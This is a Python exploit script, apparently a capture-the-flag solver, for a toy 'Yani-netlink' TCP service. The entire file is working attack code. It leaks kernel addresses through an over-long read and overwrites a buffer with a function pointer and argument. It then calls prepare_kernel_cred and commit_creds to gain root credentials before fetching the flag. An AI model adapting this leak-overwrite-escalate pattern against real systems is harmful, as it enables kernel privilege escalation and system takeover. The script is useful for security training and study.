#!/usr/bin/env python3
"""Exploit Yani-netlink over its TCP packet relay."""

import argparse
import socket
import struct


PORT = 31337
TIMEOUT = 5.0
MAX_RESPONSE = 4096
BANNER = (
    b"         (  )   (   )\n"
    b"       (      )       )\n"
    b"     (  /\\__/\\   (  )\n"
    b"      ( o . o )    )\n"
    b"       \\  ^  /---~~\n"
    b"      /      \\\n"
    b"\n"
    b"                 YANINEKO\n"
    b"       +-------------------------------+\n"
    b"       | EAT | PUKE | SMOKING | Mrrph  |\n"
    b"       +-------------------------------+\n"
    b"  YANINEKO EAT <length>\n"
    b"  YANINEKO PUKE <length> <hex>\n"
    b"  YANINEKO SMOKING\n"
    b"  YANINEKO SMOKING <address>\n"
    b"  YANINEKO Mrrph\n"
)


def _read_exact(stream, length):
    data = bytearray()
    while len(data) < length:
        chunk = stream.read(length - len(data))
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def solve(host: str, port: int) -> str:
    with socket.create_connection((host, port), timeout=TIMEOUT) as sock:
        sock.settimeout(TIMEOUT)
        stream = sock.makefile("rwb", buffering=0)
        if _read_exact(stream, len(BANNER)) != BANNER:
            raise RuntimeError("Yani Neko banner was missing")

        def exchange(command: str) -> str:
            stream.write(command.encode("ascii") + b"\n")
            response = stream.readline(MAX_RESPONSE + 1)
            if not response.endswith(b"\n"):
                raise RuntimeError("target returned an incomplete response")
            return response[:-1].decode("ascii")

        leak = exchange("YANINEKO EAT 96")
        if not leak.startswith("LEAK "):
            raise RuntimeError(f"read failed: {leak}")
        leaked = bytes.fromhex(leak[5:])
        if len(leaked) < 96:
            raise RuntimeError("short kernel leak")
        prepare, commit, init_task = struct.unpack_from("<QQQ", leaked, 64)

        first = b"A" * 64 + struct.pack("<QQ", prepare, init_task)
        if exchange(f"YANINEKO PUKE {len(first)} {first.hex()}") != f"PUKE_OK {len(first)}":
            raise RuntimeError("prepare overwrite failed")
        prepared = exchange(f"YANINEKO SMOKING 0x{prepare:x}")
        if not prepared.startswith("SMOKING_OK "):
            raise RuntimeError(f"prepare call failed: {prepared}")
        kernel_cred = int(prepared.split()[1], 16)

        second = b"B" * 64 + struct.pack("<QQ", commit, kernel_cred)
        if exchange(f"YANINEKO PUKE {len(second)} {second.hex()}") != f"PUKE_OK {len(second)}":
            raise RuntimeError("commit overwrite failed")
        committed = exchange(f"YANINEKO SMOKING 0x{commit:x}")
        if not committed.startswith("SMOKING_OK 0x0"):
            raise RuntimeError(f"commit call failed: {committed}")

        flag = exchange("YANINEKO Mrrph")
        if not flag.startswith("Mrrph "):
            raise RuntimeError(f"flag read failed: {flag}")
        return flag[5:]


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=PORT)
    args = parser.parse_args()
    print(solve(args.host, args.port))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
